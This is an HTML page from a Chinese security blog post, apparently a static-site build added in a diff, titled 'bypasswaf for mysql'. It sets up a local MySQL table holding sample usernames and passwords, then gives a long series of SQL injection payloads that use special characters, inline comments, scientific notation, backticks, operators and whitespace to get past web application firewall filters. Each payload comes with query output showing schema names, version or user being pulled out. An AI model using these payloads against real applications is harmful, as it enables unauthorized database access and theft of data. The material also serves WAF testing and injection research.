@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="0x01 先准备好用于测试库表及数据:123456789101112mysql&amp;gt; create database injection;mysql&amp;gt; use injection;mysql&amp;gt; CREATE TABLE IF NOT EXISTS `user`(	`id` INT UNSIGNED AUTO_INCREMENT,	`username` VARCHAR(30) NOT NULL,	`password` VARCHAR(40) NOT NULL,	`email` VARCHAR(40) NOT NULL,	PRIMARY KEY ( `id` )	)ENGINE=InnoDB DEFAULT CHARSET=utf8;mysql&amp;gt; insert into user(username,password,email) values(&amp;apos;gentoo&amp;apos;,&amp;apos;superman&amp;apos;,&amp;apos;sec@rootkit.org&amp;apos;);mysql&amp;gt; insert into user(username,password,email) values(&amp;apos;arch&amp;apos;,&amp;apos;welcome&amp;apos;,&amp;apos;lin@hook.org&amp;apos;);mysql&amp;gt; insert into user(username,password,email) values(&amp;apos;admin&amp;apos;,&amp;apos;loginpass&amp;apos;,&amp;apos;xlion@priv.org&amp;apos;);">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="bypasswaf for mysql [数据库层面之特殊字符篇]"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>bypasswaf for mysql [数据库层面之特殊字符篇] - APT404-不疯不魔怎么活</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/08/01/bypasswaf-on-database/">
+                bypasswaf for mysql [数据库层面之特殊字符篇]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-08-01</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/bypasswaf/">bypasswaf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 先准备好用于测试库表及数据:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database injection;</span><br><span class="line">mysql&gt; use injection;</span><br><span class="line">mysql&gt; CREATE TABLE IF NOT EXISTS `user`(</span><br><span class="line">	`id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">	`username` VARCHAR(30) NOT NULL,</span><br><span class="line">	`password` VARCHAR(40) NOT NULL,</span><br><span class="line">	`email` VARCHAR(40) NOT NULL,</span><br><span class="line">	PRIMARY KEY ( `id` )</span><br><span class="line">	)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">mysql&gt; insert into user(username,password,email) values(&apos;gentoo&apos;,&apos;superman&apos;,&apos;sec@rootkit.org&apos;);</span><br><span class="line">mysql&gt; insert into user(username,password,email) values(&apos;arch&apos;,&apos;welcome&apos;,&apos;lin@hook.org&apos;);</span><br><span class="line">mysql&gt; insert into user(username,password,email) values(&apos;admin&apos;,&apos;loginpass&apos;,&apos;xlion@priv.org&apos;);</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>测试表数据:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+----------+-----------+-----------------+</span><br><span class="line">| id | username | password  | email           |</span><br><span class="line">+----+----------+-----------+-----------------+</span><br><span class="line">|  1 | gentoo   | superman  | sec@rootkit.org |</span><br><span class="line">|  2 | arch     | welcome   | lin@hook.org    |</span><br><span class="line">|  3 | admin    | loginpass | xlion@priv.org  |</span><br><span class="line">+----+----------+-----------+-----------------+</span><br></pre></td></tr></table></figure></p>
+<p>测试表结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc user;</span><br><span class="line">+----------+------------------+------+-----+---------+----------------+</span><br><span class="line">| Field    | Type             | Null | Key | Default | Extra          |</span><br><span class="line">+----------+------------------+------+-----+---------+----------------+</span><br><span class="line">| id       | int(10) unsigned | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| username | varchar(30)      | NO   |     | NULL    |                |</span><br><span class="line">| password | varchar(40)      | NO   |     | NULL    |                |</span><br><span class="line">| email    | varchar(40)      | NO   |     | NULL    |                |</span><br><span class="line">+----------+------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure></p>
+<p>0x02 mysql中的一些特殊字符利用:<br>最常见的内联注释:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-1 union/**/(select/*!*/!.1,(select/*!50000*/schema_name from information_schema.schemata limit 0,1),2) ; -- +</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| username | password           | email |</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| 0        | information_schema | 2     |</span><br><span class="line">+----------+--------------------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用科学计数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-11e1union/**/select+null,null,null ;-- -</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| username | password | email |</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| NULL     | NULL     | NULL  |</span><br><span class="line">+----------+----------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用加减号特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-1 union/*!*/select+null,-null,/*!null*/ ;-- -</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| username | password | email |</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| NULL     | NULL     | NULL  |</span><br><span class="line">+----------+----------+-------+</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-1 union (select+1,+(select+schema_name/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| username | password           | email |</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| 1        | information_schema | 2     |</span><br><span class="line">+----------+--------------------+-------+</span><br></pre></td></tr></table></figure>
+<p>利用反引号特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select+1,+(select+`schema_name`/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| username | password           | email |</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| 1        | information_schema | 2     |</span><br><span class="line">+----------+--------------------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用破折号特性,适合用在盲注中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,(select(schema_name)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------------------+--------------------+-------+</span><br><span class="line">| username             | password           | email |</span><br><span class="line">+----------------------+--------------------+-------+</span><br><span class="line">| 18446744073709551614 | information_schema | 2     |</span><br><span class="line">+----------------------+--------------------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用 ! 特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,!(select(schema_name)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------------------+----------+-------+</span><br><span class="line">| username             | password | email |</span><br><span class="line">+----------------------+----------+-------+</span><br><span class="line">| 18446744073709551614 | 1        | 2     |</span><br><span class="line">+----------------------+----------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用 @  <code></code>特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,!(select(@`schema_name`)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------------------+----------+-------+</span><br><span class="line">| username             | password | email |</span><br><span class="line">+----------------------+----------+-------+</span><br><span class="line">| 18446744073709551614 | NULL     | 2     |</span><br><span class="line">+----------------------+----------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用 . 特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/1,(select(@`schema_name`)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| username | password | email |</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| 1        | NULL     | 2     |</span><br><span class="line">+----------+----------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用单双引号特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/&apos;1&apos;,(select(&quot;schema_name&quot;)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------+-------------+-------+</span><br><span class="line">| username | password    | email |</span><br><span class="line">+----------+-------------+-------+</span><br><span class="line">| 1        | schema_name | 2     |</span><br><span class="line">+----------+-------------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用各种括号特性,如,花括号[小括号,总括号]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/(1),(select(&quot;schema_name&quot;)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);</span><br><span class="line">+----------+-------------+-------+</span><br><span class="line">| username | password    | email |</span><br><span class="line">+----------+-------------+-------+</span><br><span class="line">| 1        | schema_name | 2     |</span><br><span class="line">+----------+-------------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>利用后向引用对付拦截 union+select+from:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-1|@sel:=(select schema_name from information_schema.schemata limit 0,1)/*!50000union*//*!50000*//*!50000select*/ 1,@sel,2;</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| username | password           | email |</span><br><span class="line">+----------+--------------------+-------+</span><br><span class="line">| 1        | information_schema | 2     |</span><br><span class="line">+----------+--------------------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>单独拦截select的情况:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-11e12union/*!50000select distinctrow*/+version(),+database(),user();</span><br><span class="line">+------------+-----------+----------------+</span><br><span class="line">| username   | password  | email          |</span><br><span class="line">+------------+-----------+----------------+</span><br><span class="line">| 5.7.17-log | injection | root@localhost |</span><br><span class="line">+------------+-----------+----------------+</span><br></pre></td></tr></table></figure></p>
+<p>拦截select 和 from 之间有特殊字符的情况,这种情况比较适合盲注:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if((select 4,\N) &gt; (select 2,\N),30,20);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| if((select 4,\N) &gt; (select 2,\N),30,20) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|                                      30 |</span><br><span class="line">+-----------------------------------------+</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,email from user where id=-1 union select if((select length(schema_name),\Nfrom information_schema.schemata limit 1) &gt; (select 1,\N),110,0),2,3;</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| username | password | email |</span><br><span class="line">+----------+----------+-------+</span><br><span class="line">| 110      | 2        | 3     |</span><br><span class="line">+----------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>灵活配合利用各类空白符,注释符:<br>注释符:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">/**/</span><br><span class="line">/*!*/</span><br><span class="line">/*!50000*/</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>空白符:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">09 0A 0B 0C 0D A0 20 .....</span><br></pre></td></tr></table></figure></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;说实话,指望单一的技巧其实是很难bypass掉现在的waf的,把前辈们的思路和技巧变着法的灵活配合起来,才有可能达到想要的效果,bypasswaf也确实是一个比较漫长的过程,因为需要你不断的去发掘各种新的一些偏门的可利用的数据库,前端脚本,http协议及各类web中间件的特性,当然啦,这次仅仅是基于各种数据库层面来说,来日方长,我们后面还会有大量的篇幅来说这个东西,今天只是先打个照面,混个脸熟…</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/bypasswaf/">#bypasswaf</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/01/01/after-roding/">关于接下来的路</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/privilege/">privilege</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/python-basic/">python basic</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
